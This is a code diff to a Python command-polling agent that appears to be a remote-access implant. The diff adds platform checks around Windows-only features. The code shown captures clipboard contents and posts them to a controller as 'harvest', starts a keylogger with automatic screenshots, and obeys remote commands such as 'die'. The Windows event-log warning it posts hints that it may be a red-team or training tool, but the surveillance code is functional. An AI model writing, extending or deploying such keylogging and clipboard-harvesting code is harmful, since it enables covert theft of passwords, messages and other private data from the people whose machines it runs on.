@@ -19,16 +19,17 @@ import pyautogui
 from io import BytesIO
 from PIL import Image
 
-import win32clipboard
-
 import threading
 from threading import Thread
 
-import win32api
-import win32con
-import win32evtlog
-import win32security
-import win32evtlogutil
+import platform
+if platform.system() == 'Windows':
+	import win32clipboard
+	import win32api
+	import win32con
+	import win32evtlog
+	import win32security
+	import win32evtlogutil
 
 from directoryHarvester import DirectoryHarvester
 
@@ -530,14 +531,17 @@ class LocalAgent:
 		elif response == 'die':
 			raise Exception('time to die')
 		elif response == 'clipboard':
-			try:
-				win32clipboard.OpenClipboard()
-				data = win32clipboard.GetClipboardData()
-				win32clipboard.CloseClipboard()
-				self.postHarvest(data, "Clipboard")
-				self.postResponse("Clipboard captured")
-			except Exception as e:
-				print("Oops, something went wrong: {}".format(e), file=sys.stderr)
+			if platform.system() == 'Windows':
+				try:
+					win32clipboard.OpenClipboard()
+					data = win32clipboard.GetClipboardData()
+					win32clipboard.CloseClipboard()
+					self.postHarvest(data, "Clipboard")
+					self.postResponse("Clipboard captured")
+				except Exception as e:
+					print("Oops, something went wrong: {}".format(e), file=sys.stderr)
+			else:
+				self.postResponse("Unsupported operation on this platform")
 			return None
 		elif response == 'screenshot':
 			try:
@@ -627,11 +631,13 @@ class LocalAgent:
 		eventType=myType, strings=descr, data=data, sid=my_sid)
 
 	def run(self, newLineAfterCmdOutput = False, autoScreenshot = True):
-		self.postWindowsEventLogWarning()
+		if platform.system() == 'Windows':
+			self.postWindowsEventLogWarning()
 		self.newLineAfterCmdOutput = newLineAfterCmdOutput
 		live = True
-		logger = Keylogger(60, self, autoScreenshot)
-		logger.start()
+		if platform.system() == 'Windows':        
+			logger = Keylogger(60, self, autoScreenshot)
+			logger.start()
 		while(live):
 			try:
 				command = self.pollCommand()
